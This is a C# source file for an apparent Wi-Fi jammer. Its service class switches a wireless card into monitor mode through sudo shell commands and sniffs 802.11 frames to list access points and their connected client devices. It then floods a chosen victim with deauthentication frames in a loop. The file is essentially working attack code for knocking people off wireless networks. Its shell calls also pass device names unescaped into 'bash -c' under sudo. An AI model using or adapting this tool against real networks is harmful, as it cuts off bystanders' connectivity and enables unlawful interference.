using System.Threading.Tasks;
using System.Globalization;
using System.Threading;
using System;
using SharpPcap;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using Microsoft.VisualBasic.FileIO;
using SharpPcap.LibPcap;
using CliWrap;
using CliWrap.Buffered;
using JammerV1.Models;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics.Contracts;

public class DeviceService : IDeviceService {

    private IInjectionDevice _captureDevice = null;

    public IInjectionDevice CaptureDevice { get => _captureDevice; }

    private static ObservableCollection<AP> AccessPoints = new ObservableCollection<AP>();
    private static List<Client> AllClients = new List<Client>();
    private static List<BlockAckPacket> BlockAcks = new List<BlockAckPacket>();

    private IOuiLookupService _ouiLookupService;

    public DeviceService(IOuiLookupService ouiLookupService) 
    {
        _ouiLookupService = ouiLookupService;
    }
    
    public async Task<bool> IsDeviceInMonitorMode(string deviceName) {
        // Trying to avoid dependency on aircrack-ng suite - use iwconfig with CliWrap.
        var stdOutBuffer = new StringBuilder();
        var result = await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"iwconfig {deviceName} | grep Mode:Monitor"})
            .ExecuteBufferedAsync();
        return result.StandardOutput.Contains("Mode:Monitor");
    }

    public async Task<bool> SetMonitorMode(string deviceName) {
        // Need to bring down the interface first
        await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo ifconfig {deviceName} down"})
            .ExecuteAsync();

        // Now put the interface into monitor mode
        var cmd = Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo iwconfig {deviceName} mode monitor"});
        var result = await cmd.ExecuteAsync();

        // Channel 11 for testing
        var c = Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo iwconfig {deviceName} channel 11"});
        var r = await cmd.ExecuteAsync();

        // Put interface back up
        await Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo ifconfig {deviceName} up"})
            .ExecuteAsync();
        return result.ExitCode == 0;
    }

    public async Task<bool> ChangeChannel(int channel) {
        Console.WriteLine("Changing channel to {0}", channel.ToString());
        var cmd = Cli.Wrap("/bin/bash")
            .WithArguments(new[] {"-c", $"sudo iwconfig {_captureDevice.Name} channel {channel.ToString()}"});
        var result = await cmd.ExecuteAsync();
        return result.ExitCode == 0;
    }

    public async Task OpenDevice()
    {
        // TODO: Here, going to need checks for: permissions, no device available, device can't do monitor mode
        // Step 1 - check if any device is already in monitor mode - best case scenario
        // Step 2 - Try to send a dummy packet to test if the device can inject packets
        // Step 3 - Loop through remaning devices which passed the above test, and try to put them into monitor mode.
        foreach(var device in CaptureDeviceList.New()) {
            try {
                if (await IsDeviceInMonitorMode(device.Name)) {
                    Console.WriteLine($"Already found {device.Name} in monitor mode, will use that");
                    _captureDevice = device as IInjectionDevice; // Set the capture device here if needed
                    return;
                }
            } catch (Exception) { }
        }
        
        foreach(var device in CaptureDeviceList.New()) {
            // wlan0 capable of injection on my debian dev machine!! WTF!!
            if (device.Name == "wlan0") {continue;}
            device.Open(DeviceModes.Promiscuous);
            try {
                // See if the device can inject packets
                byte[] dummyPacket = new byte[64];
                Array.Clear(dummyPacket, 0, dummyPacket.Length);
                device.SendPacket(dummyPacket);
                await SetMonitorMode(device.Name);
                _captureDevice =  device as IInjectionDevice;
                Console.WriteLine($"Set {device.Name} as the device");
                return;

            } catch (PcapException) { }
        }
    }

    public async Task Jam(IJammableDevice victim) {
        using (var device = _captureDevice) {
            device.Open(DeviceModes.Promiscuous);
            await ChangeChannel(victim.Channel);
            try
            {
                byte[] deauthFrame = victim.GenerateDeauthFrame();
                while (victim.IsJammed)
                {
                    await Task.Delay(100);
                    device.SendPacket(deauthFrame);
                }
            }
            catch (PcapException ex) { 
                Console.WriteLine("Got a PcapException - {0}", ex); 
            }
        }
    }

    public async Task<ObservableCollection<AP>> Scan(int secondsToRun) {
        // Register handler function
        using (var device = _captureDevice as ICaptureDevice) {
            device.OnPacketArrival += new PacketArrivalEventHandler(
                device_OnPacketArrival
            );
            
            // Open the device for capturing
            device.Open(mode: DeviceModes.Promiscuous, 
                                read_timeout: secondsToRun);

            device.StartCapture();
            await Task.Delay(secondsToRun * 1000);
            device.StopCapture();
            
            // Parse BlockAcks
            foreach (BlockAckPacket blockAck in BlockAcks)
            {
                Client? client = null;
                if (AccessPoints.Any(ap => ap.BSSID == blockAck.SourceAddress)) {
                    // The source address is the sender - this is an AP sending to a client
                    client = new Client {
                        BSSID = blockAck.SourceAddress,
                        StationMAC = blockAck.DestinationAddress,
                        Power = Math.Abs(blockAck.Power),
                        DetectedAt = blockAck.DetectedAt,
                        Vendor = _ouiLookupService.GetVendorByMacAddress(blockAck.DestinationAddress)
                    };
                }
                if (AccessPoints.Any(ap => ap.BSSID == blockAck.DestinationAddress)) {
                    // AP is the destination - client to sending to AP.
                    client = new Client {
                        BSSID = blockAck.DestinationAddress,
                        StationMAC = blockAck.SourceAddress,
                        Power = Math.Abs(blockAck.Power),
                        DetectedAt = blockAck.DetectedAt,
                        Vendor = _ouiLookupService.GetVendorByMacAddress(blockAck.SourceAddress)
                    };
                }
                if (client != null) {
                    if (!AllClients.Any(c => c.StationMAC == client.StationMAC)) {
                        AllClients.Add(client);
                    }
                }
            }

            // Associate clients and APs
            foreach (Client client in AllClients)
            {
                AP? parentAp = AccessPoints.Where(ap => ap.BSSID.Equals(client.BSSID)).FirstOrDefault();
                if (parentAp != null) { 
                    parentAp.Clients.Add(client); 
                    client.ParentAP = parentAp;
                }
            }
            AccessPoints = new ObservableCollection<AP>(AccessPoints.OrderByDescending(ap => ap.Clients.Count));  
            return AccessPoints;
        }
    }

    private static byte[] ExtractRange(byte[] packet, int start, int length) {
        byte[] resultBytes = new byte[length];
        Array.Copy(packet, start, resultBytes, 0, length);
        return resultBytes;
    }

    private static int GetChannelFromTaggedParameters(byte[] taggedParameters) {
        for (int i = 0; i < taggedParameters.Length - 2; i++)
        {
            // Look for the DS Parameter set tag sequence: 0x03 0x01
            if (taggedParameters[i] == 0x03 && taggedParameters[i + 1] == 0x01) {
                // The channel number should be right after 0x03 0x01
                return taggedParameters[i + 2];
            }
        }
        // No channel was found, hopefully this never hits D:
        return 0;
    }

    private void device_OnPacketArrival(object sender, PacketCapture e) {
        var packet = e.GetPacket();
        // packet.Data[18] contains information about what type of message the packet contains:
        // 0x80 - Beacon frame - handle "scanning" for APs
        // 0x48 - null function - communication between AP and a client
        // 0x94 - 802.11 Block Ack - clients
        switch (packet.Data[18])
        {
            case 0x80:
                /*
                Extract the SSID and BSSID of the AP
                Offset 55 - Length of SSID
                Offset 56 - Start of SSID
                Offset 34 - Start of BSSID
                6 - MAC Address Length
                */
                byte[] AP_SSID_bytes = ExtractRange(
                    packet.Data, 56, packet.Data[55]
                );
                // Handle strange behaviour when AP has no SSID - just skip it.
                if (AP_SSID_bytes.All(_byte => _byte == 0)) { break; }
                string AP_SSID = Encoding.UTF8.GetString(AP_SSID_bytes);

                string AP_BSSID = BitConverter.ToString(ExtractRange(
                    packet.Data, 34, 6
                )).Replace("-", ":");
                /*
                Within the wireless management frame, the offset of the channel flag will vary
                but it will always be the third parameter set - "DS Parameter Set".
                We can look for a parameter with the ID of 3 - which is the mentioned DS parameter
                set. DS Parameter set is tag number 3, followed by a length preamble of 1 (it's a single integer).
                Therefore, we can look for 0x03 0x01 <CHANNEL_NUMBER_HERE>.
                This occurs in 'tagged parameters' section, which begins at offset 54.
                */
                byte[] taggedParametersSection = ExtractRange(
                    packet.Data, 54, (packet.Data.Length - 54)
                );
                int AP_channel = GetChannelFromTaggedParameters(taggedParametersSection);
                /*
                Signal strength appears as a signed integer at position 14, which is within
                the radio tap header.
                */
                int AP_power = packet.Data[14] - 256;

                // Now we have everything to create and process a new AP, but do we want to?
                // Check if the device has NOT already been detected.
                if (!AccessPoints.Any(ap => ap.BSSID == AP_BSSID)) {
                    // If the device is new, create a new AP object and add it
                    AP ap = new AP {
                        SSID = AP_SSID,
                        BSSID = AP_BSSID,
                        Power = AP_power,
                        Channel = AP_channel,
                        Clients = new List<Client>()
                    };
                    AccessPoints.Add(ap);
                }
                break;
            case 0x48:
                string Station_MAC = BitConverter.ToString(ExtractRange(
                    packet.Data, 28, 6
                )).Replace("-", ":");

                string Client_BSSID = BitConverter.ToString(ExtractRange(
                    packet.Data, 22, 6
                )).Replace("-", ":");

                int power = packet.Data[14] - 256;

                // If we haven't already found the client
                if(!AllClients.Any(client => client.BSSID == Client_BSSID)) {
                    Client client = new Client {
                        BSSID = Client_BSSID,
                        StationMAC = Station_MAC,
                        Power = power,
                        DetectedAt = e.Header.Timeval.Date,
                        Vendor = _ouiLookupService.GetVendorByMacAddress(Station_MAC)
                    };
                    AllClients.Add(client);
                }
                break;
            case 0x94:
                /*
                This belongs to a 'block ack' frame. These can be sent client to AP or AP to client. There's 
                no way of telling which way round this is from the frame itself, so will need to check against recognized APs.
                Will do this after (in Scan()), so we know all recognized APs.
                */ 
                string src_address = BitConverter.ToString(ExtractRange(
                    packet.Data, 28, 6
                )).Replace("-", ":");

                string dst_address = BitConverter.ToString(ExtractRange(
                    packet.Data, 22, 6
                )).Replace("-", ":");

                int blockack_power = packet.Data[14] - 256;

                BlockAckPacket blockAckPacket = new BlockAckPacket {
                    SourceAddress = src_address,
                    DestinationAddress = dst_address,
                    Power = blockack_power,
                    DetectedAt = e.Header.Timeval.Date
                };
                BlockAcks.Add(blockAckPacket);
                break;
            default:
                break;
        }
    }
}